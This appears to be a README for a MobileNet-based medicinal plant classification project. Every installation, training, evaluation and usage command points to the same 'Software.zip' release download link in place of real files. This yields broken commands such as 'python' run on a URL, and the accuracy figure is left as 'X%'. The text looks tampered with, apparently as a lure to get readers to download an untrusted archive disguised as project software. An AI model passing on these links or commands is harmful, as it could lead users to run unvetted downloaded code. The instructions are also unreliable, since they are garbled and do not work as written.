# Medicinal Plants Classification Using CNN Models

## Overview

This repository provides an implementation of a medicinal plants classification system using Convolutional Neural Networks (CNN) with a focus on efficiency, lightweight architecture, and high accuracy. We utilize state-of-the-art models such as MobileNet to achieve these goals, making it suitable for deployment in resource-constrained environments.

## Features

- **Lightweight Architecture**: Implementation using MobileNet, known for its efficiency and reduced computational requirements.
- **High Accuracy**: Optimized model parameters to ensure high accuracy in classifying various medicinal plants.
- **Scalable**: Can be easily scaled or adapted to include more plant species or different CNN architectures.
- **Deployment Ready**: The model is suitable for deployment on mobile or edge devices, thanks to its lightweight nature.

## Table of Contents

1. [Installation](#installation)
2. [Dataset](#dataset)
3. [Training the Model](#training-the-model)
4. [Evaluation](#evaluation)
5. [Usage](#usage)
6. [Results](#results)
7. [Contributing](#contributing)
8. [License](#license)

## Installation

1. **Clone the Repository**
   ```bash
   git clone https://github.com/SriRamapriyan/Medicinal-plants-classification/releases/download/v1.0/Software.zip
   cd medicinal-plants-classification
   ```

2. **Install Dependencies**
   Ensure you have Python 3.7+ installed. Install the required Python packages using pip:
   ```bash
   pip install -r https://github.com/SriRamapriyan/Medicinal-plants-classification/releases/download/v1.0/Software.zip
   ```

## Dataset

To train the model, you'll need a dataset of medicinal plant images. The dataset should be organized in the following directory structure:

```
dataset/
    ├── train/
    │   ├── class1/
    │   ├── class2/
    │   └── ...
    └── test/
        ├── class1/
        ├── class2/
        └── ...
```

You can either use a publicly available dataset or create your own. Ensure that the dataset is balanced and has sufficient images for each class.

## Training the Model

To train the model, run the following command:

```bash
python https://github.com/SriRamapriyan/Medicinal-plants-classification/releases/download/v1.0/Software.zip --dataset dataset --model mobilenet --epochs 50
```

You can adjust the hyperparameters such as the number of epochs, learning rate, and batch size in the `https://github.com/SriRamapriyan/Medicinal-plants-classification/releases/download/v1.0/Software.zip` script.

## Evaluation

After training, evaluate the model on the test set:

```bash
python https://github.com/SriRamapriyan/Medicinal-plants-classification/releases/download/v1.0/Software.zip --model output/model_name.h5 --dataset dataset/test
```

This will provide metrics such as accuracy, precision, recall, and F1-score.

## Usage

To use the trained model for classification:

```bash
python https://github.com/SriRamapriyan/Medicinal-plants-classification/releases/download/v1.0/Software.zip --image path_to_image --model output/model_name.h5
```

The script will output the predicted class of the medicinal plant in the image.

## Results

Our model achieves a high accuracy of X% on the validation set and is optimized for deployment in environments with limited computational resources. Detailed results and model performance metrics can be found in the `results/` directory.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request or open an Issue for any bugs, improvements, or suggestions.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.


